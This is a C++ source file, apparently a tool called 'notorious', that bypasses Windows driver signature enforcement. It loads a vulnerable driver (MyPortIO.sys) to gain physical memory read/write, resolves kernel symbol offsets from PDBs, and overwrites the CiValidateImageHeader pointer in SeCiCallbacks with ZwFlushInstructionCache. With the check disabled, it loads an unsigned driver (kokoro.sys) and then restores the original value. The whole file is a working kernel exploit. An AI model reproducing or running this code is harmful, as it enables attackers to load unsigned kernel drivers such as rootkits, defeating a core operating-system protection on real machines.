// notorious.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include "stdafx.h"
#include <iostream>
#include <filesystem>
#include <vector>
#include "sf/superfetch.h"
#include "ModuleUtils.hpp"
#include "SimplestSymbolHandler.h"
#include "driver_utils.hpp"
#include "driver_comm.hpp"
#pragma comment(lib, "ntdll.lib") 

using namespace std;

std::wstring GetCurrentAppFolder() {
    wchar_t buffer[1024];
    GetModuleFileNameW(NULL, buffer, 1024);
    std::wstring::size_type pos = std::wstring(buffer).find_last_of(L"\\/");
    return std::wstring(buffer).substr(0, pos);
}

int main() {
    std::cout << R"(
------------------------------------------------------------------------------------
                      $$\                         $$\                               
                      $$ |                        \__|                              
$$$$$$$\   $$$$$$\  $$$$$$\    $$$$$$\   $$$$$$\  $$\  $$$$$$\  $$\   $$\  $$$$$$$\ 
$$  __$$\ $$  __$$\ \_$$  _|  $$  __$$\ $$  __$$\ $$ |$$  __$$\ $$ |  $$ |$$  _____|
$$ |  $$ |$$ /  $$ |  $$ |    $$ /  $$ |$$ |  \__|$$ |$$ /  $$ |$$ |  $$ |\$$$$$$\  
$$ |  $$ |$$ |  $$ |  $$ |$$\ $$ |  $$ |$$ |      $$ |$$ |  $$ |$$ |  $$ | \____$$\ 
$$ |  $$ |\$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ |\$$$$$$  |\$$$$$$  |$$$$$$$  |
\__|  \__| \______/    \____/  \______/ \__|      \__| \______/  \______/ \_______/ 
  
------------------------------------------------------------------------------------
)" << std::endl;

	printf("[+] Try Load Driver\n");
	bool status = DriverUtils::LoadDriver(GetCurrentAppFolder() + L"\\MyPortIO.sys", L"MyPortIO");
    if (!status)
    {
        printf("Failed to load driver.");
        return -1;
    }
	status = OpenDriverDevice();
    if (!status)
    {
        printf("Failed to open device.");
        return -1;
    }
	printf("[+] Driver loaded and device opened successfully.\n");
	printf("[+] Resolving symbol offsets...\n");
	uint64_t off_ZwFlushInstructionCache = 0;
	uint64_t off_CiValidateImageHeader = 0;
    // now get offset from pdb
    std::vector<std::wstring> targetBinaries = {
        L"C:\\Windows\\System32\\ntoskrnl.exe"
    };

    std::vector<SymNeeded> symbolsToRetrieve{
        { L"ntoskrnl.exe", L"ZwFlushInstructionCache" },
        { L"ntoskrnl.exe", L"SeCiCallbacks" }
    };

    SimplestSymbolHandler handler(GetCurrentAppFolder() + L"\\Symbols");

    for (const auto& binPath : targetBinaries) {
        auto pdbPath = handler.GetPDB(binPath);
        if (pdbPath.empty()) {
            std::wcout << L"[-] Failed to get symbol for " << binPath << std::endl;
            return -1;
        }

        std::vector<std::wstring> symbolsForThisFile{};
        for (const auto& sym : symbolsToRetrieve) {
            if (binPath.find(sym.binaryName) == std::wstring::npos) {
                continue;
            }
            symbolsForThisFile.push_back(sym.symbolName);
        }

        auto offsets = handler.GetOffset(pdbPath, symbolsForThisFile);
        if (offsets.size() != symbolsForThisFile.size()) {
            std::wcout << L"[-] Failed to get offsets for " << binPath << std::endl;
            return -1;
        }

        auto filename = std::filesystem::path(binPath).filename().wstring();
        std::wcout << L"[" << filename << L"]" << std::endl;
        for (size_t i = 0; i < symbolsForThisFile.size(); i++) {
            std::wcout << symbolsForThisFile[i] << L"=0x" << std::hex << offsets[i] << std::endl;
            if (symbolsForThisFile[i] == L"ZwFlushInstructionCache") {
                off_ZwFlushInstructionCache = offsets[i];
            }
            else if (symbolsForThisFile[i] == L"SeCiCallbacks") {
                off_CiValidateImageHeader = offsets[i];
            }
        }
		
        std::wcout << std::endl;
    }

    auto const mm = spf::memory_map::current();
    if (!mm) {
        printf("[-] Failed to create memory map: %d\n", static_cast<int>(mm.error()));
    }
    else {
        // Any kernel virtual address.
        const auto [ntoskrnl_base, ntoskrnl_size] = []() {
            std::uint64_t base = 0;
            ULONG size = 0;
            if (!ModuleUtil::GetKernelModuleAddress("ntoskrnl.exe", base, size))
                return std::make_pair(0ull, 0ul);
            return std::make_pair(base, size);
        }();
        
		printf("[+] ntoskrnl.exe base: %p, size: 0x%X\n", (void*)ntoskrnl_base, ntoskrnl_size);

        if (!ntoskrnl_base || !ntoskrnl_size)
        {
            printf("Failed to get kernel base.");
            return -2;
        }

        void const* const virt = (const void*)ntoskrnl_base;

        std::uint64_t const phys = mm->translate(virt);
        if (!phys) {
            printf("[-] Failed to translate virtual address: %p\n", virt);
            return -1;
        }
        else {
            std::printf("[+] %p -> %zX\n", virt, phys);
        }

        void const* const zwvirt = (const void*)(ntoskrnl_base + off_ZwFlushInstructionCache);
		std::uint64_t const zwphys = mm->translate(zwvirt);
        if (!zwphys) {
            printf("[-] Failed to translate virtual address: %p\n", zwvirt);
            return -1;
        }
        else {
            std::printf("[+] %p -> %zX\n", zwvirt, zwphys);
		}

        //ciValidateImageHeaderEntry = CiValidateImageHeader + 0x20
		void const* const civirt = (const void*)(ntoskrnl_base + off_CiValidateImageHeader + 0x20);
		std::uint64_t const ciphys = mm->translate(civirt); 
        if (!ciphys) {
            printf("[-] Failed to translate virtual address: %p\n", civirt);
			return -1;
        }
        else {
            std::printf("[+] %p -> %zX\n", civirt, ciphys);
		}
        
        
		uint64_t cidata = 0;

		if (!ReadPhysMemory(g_hDevice, ciphys, &cidata, sizeof(cidata))) {
			printf("[-] Failed to read CiValidateImageHeader pointer from phys=0x%016llX\n",
				static_cast<unsigned long long>(ciphys));
			return -1;
		}

		printf("[+] ptr at CiValidateImageHeader: 0x%016llX\n", cidata);

		//we replace the ptr with the virtual addr of ZwFlushInstructionCache then it will return eternal true for any image header and bypass CI

		WritePhysMemory(g_hDevice, ciphys, &zwvirt, sizeof(zwvirt));
		status = DriverUtils::LoadDriver(GetCurrentAppFolder() + L"\\kokoro.sys", L"kokoro");
        if (!status)
        {
            printf("Failed to load driver error = %lu",GetLastError());
        }
		WritePhysMemory(g_hDevice, ciphys, &cidata, sizeof(cidata)); // 恢复原值
		DriverUtils::UnloadDriver(L"MyPortIO");

    }

    system("pause");
    return 0;
}
